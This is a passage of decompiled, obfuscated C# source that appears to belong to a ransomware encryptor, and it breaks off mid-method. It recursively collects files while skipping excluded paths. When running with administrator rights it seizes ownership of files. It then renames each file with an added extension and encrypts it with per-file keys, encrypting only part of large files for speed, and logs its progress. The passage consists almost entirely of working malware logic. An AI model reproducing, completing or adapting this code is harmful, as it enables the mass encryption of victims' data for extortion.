using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using QFSLrCXCNYPIKJ;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using pLpOiMPKFBqsYEtBP;

namespace azCTgkmpGT;

internal sealed class cQHVlxVivZVq
{
	public sealed class WfwjzXqMlnLKXBb
	{
		private static StringCollection UnvRrQGflzv;

		private static List<string> qGJAheLzWQw;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107350065));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107350060)) && !text.ToLower().Contains(getString_0(107350007)) && !text.ToLower().Contains(getString_0(107401237)) && !text.ToLower().Contains(getString_0(107401256)) && !text.ToLower().Contains(getString_0(107350026)) && !text.ToLower().Contains(getString_0(107401076)) && !text.ToLower().Contains(getString_0(107400505)) && !text.ToLower().Contains(getString_0(107400520)) && !text.ToLower().Contains(getString_0(107400471)) && !text.ToLower().Contains(getString_0(107400486)) && !text.ToLower().Contains(getString_0(107400452)) && !text.ToLower().Contains(getString_0(107400403)) && !text.ToLower().Contains(getString_0(107400386)) && !text.ToLower().Contains(getString_0(107400373)) && !text.ToLower().Contains(getString_0(107400352)) && !text.ToLower().Contains(getString_0(107400339)) && !text.ToLower().Contains(getString_0(107400358)) && !text.ToLower().Contains(getString_0(107400309)) && !text.ToLower().Contains(getString_0(107400324)) && !text.Contains(sNXkawcfFmeqKOWI(getString_0(107400787))) && !text.Contains(getString_0(107400762)) && !text.Contains(getString_0(107400781)) && !text.EndsWith(getString_0(107395586)) && !text.EndsWith(getString_0(107400724)) && !text.EndsWith(getString_0(107400751)) && !text.EndsWith(getString_0(107400746)) && !text.EndsWith(getString_0(107400741)) && !text.ToLower().Contains(getString_0(107400704)) && !text.ToLower().Contains(ZLERFztvScvXGTf))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(FoLsSeMcEVuV) * 1024.0 * 1024.0 && QotWPeyjvzjx == getString_0(107396819))
							{
								qGJAheLzWQw.Add(text);
							}
							else if (File.Exists(text) && QotWPeyjvzjx == getString_0(107396385))
							{
								qGJAheLzWQw.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return qGJAheLzWQw;
		}

		static WfwjzXqMlnLKXBb()
		{
			Strings.CreateGetStringDelegate(typeof(WfwjzXqMlnLKXBb));
			UnvRrQGflzv = new StringCollection();
			qGJAheLzWQw = new List<string>();
		}
	}

	private sealed class qfTxGPzVjXWk
	{
		public string vjohKiJyzSRaUeWhX;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == vjohKiJyzSRaUeWhX;
		}
	}

	private sealed class ckfPtqCGdlNQCoO
	{
		public string RSMlmXfaxX;

		public bool _003CIsDriveNTFS_003Eb__17(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == RSMlmXfaxX;
		}
	}

	private sealed class UQyIdXpopedb
	{
		private sealed class dudAXZhmtbbgbZ
		{
			public UQyIdXpopedb sdQWSqnbKDkIYTn;

			public string QHcameMEDyksqkWY;

			public void _003CCrypt_003Eb__21()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					FZyglfulTLXH(WindowsIdentity.GetCurrent().Name, QHcameMEDyksqkWY);
				}
			}

			public void _003CCrypt_003Eb__22()
			{
				IwShHypWIMU(QHcameMEDyksqkWY, sdQWSqnbKDkIYTn.CqITlEjkWXnTK, sdQWSqnbKDkIYTn.tNRwfpjZiNCOM, sdQWSqnbKDkIYTn.aFwtZhkyhonxJx, sdQWSqnbKDkIYTn.XXWrItZGjdyeN);
			}
		}

		public string[] CqITlEjkWXnTK;

		public string[] aFwtZhkyhonxJx;

		public string XXWrItZGjdyeN;

		public string tNRwfpjZiNCOM;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__20(string string_0)
		{
			dudAXZhmtbbgbZ CS_0024_003C_003E8__locals0 = new dudAXZhmtbbgbZ();
			CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn = this;
			CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY = string_0;
			if (bTMUTlJGkGOO && !znndCnnZrNYoVh().Contains(getString_0(107398422)) && !znndCnnZrNYoVh().Contains(getString_0(107398318)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						FZyglfulTLXH(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (gsXyoeFOorGZ == getString_0(107396826))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					IwShHypWIMU(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.sdQWSqnbKDkIYTn.XXWrItZGjdyeN);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				IwShHypWIMU(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CqITlEjkWXnTK, tNRwfpjZiNCOM, aFwtZhkyhonxJx, XXWrItZGjdyeN);
			}
		}

		static UQyIdXpopedb()
		{
			Strings.CreateGetStringDelegate(typeof(UQyIdXpopedb));
		}
	}

	private sealed class zPoLbQDPrHj
	{
		private sealed class MlhxfWYHvBPnrE
		{
			public zPoLbQDPrHj nTnXDlFGnPsXG;

			public string tDwFwsGDrP;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__30()
			{
				try
				{
					if (SidumIOOlYmWUm)
					{
						Console.WriteLine(getString_0(107349541) + tDwFwsGDrP + getString_0(107349982) + new FileInfo(tDwFwsGDrP).Length + getString_0(107349929));
						Console.WriteLine(getString_0(107349516), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
						Console.WriteLine(getString_0(107349459), VxQUKIskXHMm.Elapsed);
						Console.WriteLine(getString_0(107349952));
					}
				}
				catch
				{
				}
			}

			static MlhxfWYHvBPnrE()
			{
				Strings.CreateGetStringDelegate(typeof(MlhxfWYHvBPnrE));
			}
		}

		private sealed class tdXNNsWJFtDVWeIAq
		{
			public MlhxfWYHvBPnrE FBthsJRqPLob;

			public zPoLbQDPrHj nTnXDlFGnPsXG;

			public string XmJykDMKNMhzu;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (XmJykDMKNMhzu.ToLower().EndsWith(item + nTnXDlFGnPsXG.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == getString_0(107396841))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(XmJykDMKNMhzu).Length)
						{
							try
							{
								aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401479), getString_0(107401474), getString_0(107401429), XmJykDMKNMhzu);
							}
							catch
							{
							}
						}
					}
					else if (XmJykDMKNMhzu.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396407))
					{
						try
						{
							aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401479), getString_0(107401474), getString_0(107401429), XmJykDMKNMhzu);
						}
						catch
						{
						}
					}
				}
			}

			static tdXNNsWJFtDVWeIAq()
			{
				Strings.CreateGetStringDelegate(typeof(tdXNNsWJFtDVWeIAq));
			}
		}

		private sealed class UgmkrRPmQyDLrq
		{
			public zPoLbQDPrHj nTnXDlFGnPsXG;

			public string tDwFwsGDrP;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				try
				{
					if (SidumIOOlYmWUm)
					{
						Console.WriteLine(getString_0(107349548) + tDwFwsGDrP + getString_0(107349989) + new FileInfo(tDwFwsGDrP).Length + getString_0(107349936));
						Console.WriteLine(getString_0(107349523), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
						Console.WriteLine(getString_0(107349466), VxQUKIskXHMm.Elapsed);
						Console.WriteLine(getString_0(107349959));
					}
				}
				catch
				{
				}
			}

			public void _003CWorkerCrypter2_003Eb__34()
			{
				foreach (string item in tnUDcbYyevrzGRJA)
				{
					if (tDwFwsGDrP.ToLower().EndsWith(item + nTnXDlFGnPsXG.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == getString_0(107396844))
					{
						if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(tDwFwsGDrP).Length)
						{
							try
							{
								aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401482), getString_0(107401477), getString_0(107401432), tDwFwsGDrP);
							}
							catch
							{
							}
						}
					}
					else if (tDwFwsGDrP.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == getString_0(107396410))
					{
						try
						{
							aDJKTHVvtfISh.AUzNYWrxJKEB(getString_0(107401482), getString_0(107401477), getString_0(107401432), tDwFwsGDrP);
						}
						catch
						{
						}
					}
				}
			}

			static UgmkrRPmQyDLrq()
			{
				Strings.CreateGetStringDelegate(typeof(UgmkrRPmQyDLrq));
			}
		}

		public List<string> pyrQmieHmmx;

		public List<string> aGPipPUJxaM;

		public string NWwyysQYwQDK;

		public string[] OyagJirLxGEcF;

		public string OxsDDfqLEi;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2f(string string_0)
		{
			using List<string>.Enumerator enumerator = aGPipPUJxaM.GetEnumerator();
			tdXNNsWJFtDVWeIAq CS_0024_003C_003E8__locals0;
			while (enumerator.MoveNext())
			{
				MlhxfWYHvBPnrE CS_0024_003C_003E8__locals1 = new MlhxfWYHvBPnrE();
				CS_0024_003C_003E8__locals1.nTnXDlFGnPsXG = this;
				CS_0024_003C_003E8__locals1.tDwFwsGDrP = enumerator.Current;
				if (CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107401327)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107401334)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107401301)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107401252)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107401271)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107401246)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107401193)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107401212)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107401167)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107401130)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107401153)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107401104)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107401110)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107400577)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400520)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400535)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400486)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400501)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400452)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400467)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400418)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400401)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400388)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400367)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107400354)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107400373)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107400324)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.ToLower().Contains(getString_0(107400339)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(sNXkawcfFmeqKOWI(getString_0(107400802))) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400777)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107397084)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400796)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(NWwyysQYwQDK) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(getString_0(107400739)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(getString_0(107400766)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(getString_0(107400761)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(getString_0(107400756)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(getString_0(107400719)) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(ZLERFztvScvXGTf) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(bDDJFCkjBbYQ) || CS_0024_003C_003E8__locals1.tDwFwsGDrP.Contains(IKRtRLOSqagD))
				{
					continue;
				}
				if (OyagJirLxGEcF.Length != 0)
				{
					string[] oyagJirLxGEcF = OyagJirLxGEcF;
					int num = 0;
					while (num < oyagJirLxGEcF.Length)
					{
						string value = oyagJirLxGEcF[num];
						if (!CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1119;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(NWwyysQYwQDK))
					{
						goto IL_1119;
					}
				}
				catch (Exception)
				{
					goto IL_1119;
				}
				if (!CS_0024_003C_003E8__locals1.tDwFwsGDrP.EndsWith(string_0) || JEkdiihxCoWf.Contains(CS_0024_003C_003E8__locals1.tDwFwsGDrP))
				{
					continue;
				}
				if (NgbDiBVJKDTW == getString_0(107396834))
				{
					try
					{
						if (SqYdHlCliRAG.MyilMlfEAq(CS_0024_003C_003E8__locals1.tDwFwsGDrP))
						{
							SqYdHlCliRAG.QRVaUKMRQBopeRUy(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
						}
					}
					catch
					{
					}
				}
				JEkdiihxCoWf.Add(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
				Thread thread = new Thread((ThreadStart)delegate
				{
					try
					{
						if (SidumIOOlYmWUm)
						{
							Console.WriteLine(MlhxfWYHvBPnrE.getString_0(107349541) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + MlhxfWYHvBPnrE.getString_0(107349982) + new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length + MlhxfWYHvBPnrE.getString_0(107349929));
							Console.WriteLine(MlhxfWYHvBPnrE.getString_0(107349516), JEkdiihxCoWf.Count, DPjjDEUnrYJ, ZzaknwGiCeEd);
							Console.WriteLine(MlhxfWYHvBPnrE.getString_0(107349459), VxQUKIskXHMm.Elapsed);
							Console.WriteLine(MlhxfWYHvBPnrE.getString_0(107349952));
						}
					}
					catch
					{
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
				if (!IDUZlSGaIfn.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.tDwFwsGDrP)))
				{
					IDUZlSGaIfn.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.tDwFwsGDrP));
				}
				imzSfhQVzYADk(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
				try
				{
					new lERBUhOhgv().ylvknGhZJxVcmAc(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals1.tDwFwsGDrP, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (SidumIOOlYmWUm)
							{
								Console.WriteLine(getString_0(107349992) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107349979) + new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length + getString_0(107349926));
								Console.WriteLine(getString_0(107349949));
							}
						}
						catch
						{
						}
						HnVlWPPowq(sNXkawcfFmeqKOWI(getString_0(107349332)), getString_0(107400667) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107400667) + sNXkawcfFmeqKOWI(getString_0(107349307)) + getString_0(107400667) + Environment.UserName + getString_0(107400667) + sNXkawcfFmeqKOWI(getString_0(107349258)));
					}
				}
				catch (Exception ex2)
				{
					if (SWaMdrdKGgzowGl)
					{
						try
						{
							File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107349233) + ex2.Message + getString_0(107395942));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (SWaMdrdKGgzowGl)
						{
							try
							{
								File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107349184) + ex4.Message + getString_0(107395942));
							}
							catch (Exception)
							{
							}
						}
						ZzaknwGiCeEd++;
						goto end_IL_08ba;
					}
					if (krdgQbbXWsBnkAs == getString_0(107396834) && new FileInfo(CS_0024_003C_003E8__locals1.tDwFwsGDrP).Length > Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024 && !pyrQmieHmmx.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new tdXNNsWJFtDVWeIAq();
						CS_0024_003C_003E8__locals0.FBthsJRqPLob = CS_0024_003C_003E8__locals1;
						CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG = this;
						try
						{
							if (NWwyysQYwQDK != getString_0(107398304))
							{
								if (OtvlrYHFRq)
								{
									NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
								}
								File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK);
							}
						}
						catch (Exception ex6)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107349603) + ex6.Message + getString_0(107395942));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_08ba;
						}
						CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = getString_0(107401359);
						if (NWwyysQYwQDK != getString_0(107398304))
						{
							CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK;
						}
						else
						{
							CS_0024_003C_003E8__locals0.XmJykDMKNMhzu = CS_0024_003C_003E8__locals1.tDwFwsGDrP;
						}
						if (pRibgXhmfietto == getString_0(107396834))
						{
							Thread thread2 = new Thread((ThreadStart)delegate
							{
								foreach (string item in tnUDcbYyevrzGRJA)
								{
									if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG.NWwyysQYwQDK) && OGIisKmpnCtjYJtSZ == tdXNNsWJFtDVWeIAq.getString_0(107396841))
									{
										if (Convert.ToInt32(dKLzVpzOOKvyJbR) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu).Length)
										{
											try
											{
												aDJKTHVvtfISh.AUzNYWrxJKEB(tdXNNsWJFtDVWeIAq.getString_0(107401479), tdXNNsWJFtDVWeIAq.getString_0(107401474), tdXNNsWJFtDVWeIAq.getString_0(107401429), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.XmJykDMKNMhzu.ToLower().EndsWith(item) && OGIisKmpnCtjYJtSZ == tdXNNsWJFtDVWeIAq.getString_0(107396407))
									{
										try
										{
											aDJKTHVvtfISh.AUzNYWrxJKEB(tdXNNsWJFtDVWeIAq.getString_0(107401479), tdXNNsWJFtDVWeIAq.getString_0(107401474), tdXNNsWJFtDVWeIAq.getString_0(107401429), CS_0024_003C_003E8__locals0.XmJykDMKNMhzu);
										}
										catch
										{
										}
									}
								}
							});
							thread2.Priority = ThreadPriority.Normal;
							thread2.IsBackground = false;
							thread2.Start();
						}
						string text = WQPkeOvEci.SBPfmWOaNeINeU(32);
						string text2 = getString_0(107401359);
						text2 = (UpNccIaFzBadyA ? WQPkeOvEci.JZQcnaocigGbMUm() : getString_0(107401359));
						string s = pEVoDrneEBXda.qxtPYzjMemryI(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (dhEsUcbXeBeyR == getString_0(107396400))
						{
							byte[] array = null;
							byte[] byte_ = VbJxNITbKqkCPhG.KlRCrLIVmNrA(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, Convert.ToInt32(bQealBkUmzhp) * 1024 * 1024);
							if (VbJxNITbKqkCPhG.ilkRJUapRp(tRlxUGmSHDq: (!OTLCmOpFsMP) ? (UpNccIaFzBadyA ? VbJxNITbKqkCPhG.QTulHfZYmae(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : VbJxNITbKqkCPhG.QTulHfZYmae(byte_, Convert.FromBase64String(OxsDDfqLEi), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (UpNccIaFzBadyA ? mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : mLvAvjKKGJxbb.RlhTeYZQFxqeS(byte_, Convert.FromBase64String(OxsDDfqLEi), Convert.FromBase64String(lXgIUpLgAi))), THVIvWtEdHnQ: CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, UjxCrHgnMeLgc: bytes))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							}
							catch (Exception)
							{
							}
						}
						else if (!UpNccIaFzBadyA)
						{
							if (WjbOIdEJgeh.eNKyKoZcjDOajb(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, OxsDDfqLEi, null, Convert.FromBase64String(lXgIUpLgAi)))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (WjbOIdEJgeh.eNKyKoZcjDOajb(CS_0024_003C_003E8__locals0.XmJykDMKNMhzu, bQealBkUmzhp, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_1119;
							}
							try
							{
								File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (OtvlrYHFRq)
					{
						NWwyysQYwQDK = YgTmUCLcTtww + NWwyysQYwQDK;
					}
					string text3 = WQPkeOvEci.SBPfmWOaNeINeU(32);
					string text4 = getString_0(107401359);
					text4 = (UpNccIaFzBadyA ? WQPkeOvEci.JZQcnaocigGbMUm() : getString_0(107401359));
					string s2 = pEVoDrneEBXda.qxtPYzjMemryI(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (NWwyysQYwQDK != getString_0(107398304))
					{
						if (!NbfRNVirWcO)
						{
							if (!UpNccIaFzBadyA)
							{
								gPkUEdrnpNAX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk);
							}
							else
							{
								gPkUEdrnpNAX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!UpNccIaFzBadyA)
								{
									bgAiWEPrFUh(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
								}
								else
								{
									bgAiWEPrFUh(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (SWaMdrdKGgzowGl)
								{
									try
									{
										File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107398290) + ex11.Message + getString_0(107395942));
									}
									catch (Exception)
									{
									}
								}
								ZzaknwGiCeEd++;
								try
								{
									File.Move(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, CS_0024_003C_003E8__locals1.tDwFwsGDrP);
								}
								catch (Exception)
								{
								}
								goto end_IL_08ba;
							}
						}
					}
					else if (!NbfRNVirWcO)
					{
						if (!UpNccIaFzBadyA)
						{
							gPkUEdrnpNAX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107398299), nQCMwcWKyQk);
						}
						else
						{
							gPkUEdrnpNAX(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107398299), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!UpNccIaFzBadyA)
							{
								bgAiWEPrFUh(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP, nQCMwcWKyQk, Convert.FromBase64String(lXgIUpLgAi));
							}
							else
							{
								bgAiWEPrFUh(CS_0024_003C_003E8__locals1.tDwFwsGDrP, CS_0024_003C_003E8__locals1.tDwFwsGDrP, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (SWaMdrdKGgzowGl)
							{
								try
								{
									File.AppendAllText(bDDJFCkjBbYQ, getString_0(107399044) + CS_0024_003C_003E8__locals1.tDwFwsGDrP + getString_0(107398290) + ex14.Message + getString_0(107395942));
								}
								catch (Exception)
								{
								}
							}
							ZzaknwGiCeEd++;
							goto end_IL_08ba;
						}
					}
					if (UpNccIaFzBadyA)
					{
						if (NWwyysQYwQDK != getString_0(107398304))
						{
							VbClOPiwZbe(CS_0024_003C_003E8__locals1.tDwFwsGDrP + NWwyysQYwQDK, bytes2);
						}
						else
						{
							VbClOPiwZbe(CS_0024_003C_003E8__locals1.tDwFwsGDrP, bytes2);
						}
					}
					goto IL_1119;
					end_IL_08ba:;
				}
				catch (Exception)
				{
					goto IL_1119;
				}
				continue;
				IL_1119:
				aGPipPUJxaM.Remove(CS_0024_003C_003E8__locals1.tDwFwsGDrP);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			UgmkrRPmQyDLrq CS_0024_003C_003E8__locals0 = new UgmkrRPmQyDLrq();
			CS_0024_003C_003E8__locals0.nTnXDlFGnPsXG = this;
			CS_0024_003C_003E8__locals0.tDwFwsGDrP = string_0;
